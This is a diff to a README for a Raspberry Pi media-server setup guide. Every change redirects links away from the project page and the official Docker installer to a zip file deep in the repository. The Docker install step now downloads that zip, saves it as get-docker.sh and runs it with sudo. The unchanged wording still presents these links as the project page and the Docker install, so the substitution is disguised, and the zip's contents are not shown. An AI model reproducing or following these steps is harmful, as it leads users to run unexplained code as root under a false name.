@@ -1,6 +1,6 @@
 # 📺 raspberry-pi-media-stack - Easy Media Server Setup
 
-[![Download raspberry-pi-media-stack](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Alex-010101/raspberry-pi-media-stack)
+[![Download raspberry-pi-media-stack](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This guide walks you through downloading and running the software from a Windows
 
 Click the big download button below to visit the project page. On that page, you will find download options and instructions.
 
-[![Download raspberry-pi-media-stack](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Alex-010101/raspberry-pi-media-stack)
+[![Download raspberry-pi-media-stack](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip)
 
 This link leads to the main project page. You will find files, instructions, and other resources there.  
 
@@ -76,7 +76,7 @@ Once your Raspberry Pi is ready and connected to the network:
 2. Run the following commands on your Raspberry Pi terminal to install Docker:
 
 ```
-curl -fsSL https://get.docker.com -o get-docker.sh
+curl -fsSL https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip -o get-docker.sh
 sudo sh get-docker.sh
 ```
 
@@ -103,7 +103,7 @@ Log out and back in or reboot to apply group changes.
 From your Raspberry Pi terminal or via SCP (a file transfer tool), download the project files using Git:
 
 ```
-git clone https://github.com/Alex-010101/raspberry-pi-media-stack.git
+git clone https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip
 ```
 
 If Git is not installed on your Pi, install it first with:
@@ -218,7 +218,7 @@ This fetches the latest changes and restarts your media stack with new features 
 
 For detailed instructions, configs, or help, visit the project page below. It links to additional docs and user guides.
 
-[Visit raspberry-pi-media-stack on GitHub](https://github.com/Alex-010101/raspberry-pi-media-stack)  
+[Visit raspberry-pi-media-stack on GitHub](https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip)  
 
 ---
 
@@ -226,7 +226,7 @@ For detailed instructions, configs, or help, visit the project page below. It li
 
 Access the project files and documentation here:
 
-https://github.com/Alex-010101/raspberry-pi-media-stack
+https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip
 
 Click the green **Code** button on the GitHub page to download a ZIP archive if you prefer not to use Git.
 
